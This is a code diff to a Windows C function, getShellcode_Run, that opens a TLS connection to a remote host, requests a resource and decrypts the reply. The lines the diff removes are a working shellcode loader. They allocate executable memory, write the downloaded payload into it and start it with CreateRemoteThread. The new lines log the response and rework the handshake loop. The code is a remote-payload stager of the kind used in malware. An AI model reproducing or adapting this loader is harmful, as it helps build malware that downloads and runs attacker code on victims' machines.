@@ -434,8 +434,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     }
     DebugLog("Connected to server on socket %d\n", (int)ConnectSocket);
 
-    // Set receive timeout to 5 seconds
-    int timeout = 5000; // 5 seconds
+    // Set receive timeout to 10 seconds
+    int timeout = 10000; // 10 seconds
     iResult = setsockopt(ConnectSocket, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));
     if (iResult == SOCKET_ERROR) {
         DebugLog("setsockopt (SO_RCVTIMEO) failed: %d\n", WSAGetLastError());
@@ -443,7 +443,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         WSACleanup();
         return;
     }
-    DebugLog("Set receive timeout to 5 seconds\n");
+    DebugLog("Set receive timeout to 10 seconds\n");
 
     // Initialize security context for SSL/TLS
     SCHANNEL_CRED schannelCred = {0};
@@ -498,48 +498,31 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     inBuffers[0].pvBuffer = sslBuf;
     inBuffers[0].BufferType = SECBUFFER_TOKEN;
     inBuffers[0].cbBuffer = 0;
+    inBuffers[1].pvBuffer = NULL;
     inBuffers[1].BufferType = SECBUFFER_EMPTY;
+    inBuffers[1].cbBuffer = 0;
     inBuffer.cBuffers = 2;
     inBuffer.pBuffers = inBuffers;
     inBuffer.ulVersion = SECBUFFER_VERSION;
 
-    do {
-        if (inBuffers[0].cbBuffer < 5) { // Need at least 5 bytes to read the TLS record header
-            iResult = recv(ConnectSocket, sslBuf + inBuffers[0].cbBuffer, sizeof(sslBuf) - inBuffers[0].cbBuffer, 0);
-            if (iResult <= 0) {
-                DebugLog("recv (handshake) failed or connection closed: %d\n", WSAGetLastError());
-                goto Cleanup;
-            }
-            inBuffers[0].cbBuffer += iResult;
-            DebugLog("Received %d bytes for handshake: total buffer size now %d\n", iResult, inBuffers[0].cbBuffer);
-            DebugLog("First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
-                     sslBuf[0], sslBuf[1], sslBuf[2], sslBuf[3], sslBuf[4], sslBuf[5], sslBuf[6], sslBuf[7],
-                     sslBuf[8], sslBuf[9], sslBuf[10], sslBuf[11], sslBuf[12], sslBuf[13], sslBuf[14], sslBuf[15]);
+    while (true) {
+        // Receive data from the server
+        iResult = recv(ConnectSocket, sslBuf + inBuffers[0].cbBuffer, sizeof(sslBuf) - inBuffers[0].cbBuffer, 0);
+        if (iResult <= 0) {
+            DebugLog("recv (handshake) failed or connection closed: %d\n", WSAGetLastError());
+            goto Cleanup;
         }
+        inBuffers[0].cbBuffer += iResult;
+        DebugLog("Received %d bytes for handshake: total buffer size now %d\n", iResult, inBuffers[0].cbBuffer);
+        DebugLog("First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
+                 sslBuf[0], sslBuf[1], sslBuf[2], sslBuf[3], sslBuf[4], sslBuf[5], sslBuf[6], sslBuf[7],
+                 sslBuf[8], sslBuf[9], sslBuf[10], sslBuf[11], sslBuf[12], sslBuf[13], sslBuf[14], sslBuf[15]);
 
-        // Check if we have enough bytes to read the record length
-        if (inBuffers[0].cbBuffer >= 5) {
-            unsigned short recordLen = (sslBuf[3] << 8) + sslBuf[4];
-            DebugLog("TLS record length: %d bytes\n", recordLen);
-            while (inBuffers[0].cbBuffer < recordLen + 5) {
-                iResult = recv(ConnectSocket, sslBuf + inBuffers[0].cbBuffer, (recordLen + 5) - inBuffers[0].cbBuffer, 0);
-                if (iResult <= 0) {
-                    DebugLog("recv (additional handshake data) failed or connection closed: %d\n", WSAGetLastError());
-                    goto Cleanup;
-                }
-                inBuffers[0].cbBuffer += iResult;
-                DebugLog("Received additional %d bytes for handshake: total buffer size now %d\n", iResult, inBuffers[0].cbBuffer);
-                DebugLog("First 16 bytes: %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x %02x\n",
-                         sslBuf[0], sslBuf[1], sslBuf[2], sslBuf[3], sslBuf[4], sslBuf[5], sslBuf[6], sslBuf[7],
-                         sslBuf[8], sslBuf[9], sslBuf[10], sslBuf[11], sslBuf[12], sslBuf[13], sslBuf[14], sslBuf[15]);
-            }
-        }
-
+        // Process the received data with Schannel
         secStatus = InitializeSecurityContextA(&hCred, &hContext, (SEC_CHAR*)host, dwFlags, 0, 0,
                                               &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
-        
+
         if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
-            inBuffers[0].cbBuffer = 0;
             DebugLog("Incomplete handshake message, waiting for more data\n");
             continue;
         }
@@ -555,6 +538,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 }
                 DebugLog("Sent %d bytes for handshake continuation\n", iResult);
             }
+            // Reset the input buffer for the next round of data
+            inBuffers[0].cbBuffer = 0;
         }
 
         if (secStatus == SEC_E_OK) {
@@ -564,8 +549,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             DebugLog("Handshake failed unexpectedly: %x\n", secStatus);
             goto Cleanup;
         }
-
-    } while (true);
+    }
 
     // Encrypt and send the HTTP request
     SecPkgContext_StreamSizes sizes;
@@ -638,17 +622,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             if (secStatus == SEC_E_OK) {
                 memcpy(recvbuf, inBuffers[1].pvBuffer, inBuffers[1].cbBuffer);
                 int payloadSize = inBuffers[1].cbBuffer;
-                DebugLog("Decrypted %d bytes of shellcode\n", payloadSize);
-
-                // Execute shellcode
-                HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
-                PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, payloadSize, 
-                                                  (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-                WriteProcessMemory(processHandle, remoteBuffer, recvbuf, payloadSize, NULL);
-                HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, 
-                                                       (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
-                CloseHandle(processHandle);
-                DebugLog("Shellcode executed\n");
+                DebugLog("Decrypted %d bytes of response\n", payloadSize);
+                DebugLog("Response: %.*s\n", payloadSize, recvbuf);
                 break;
             } else if (secStatus == SEC_E_INCOMPLETE_MESSAGE) {
                 DebugLog("Incomplete response message, waiting for more data\n");
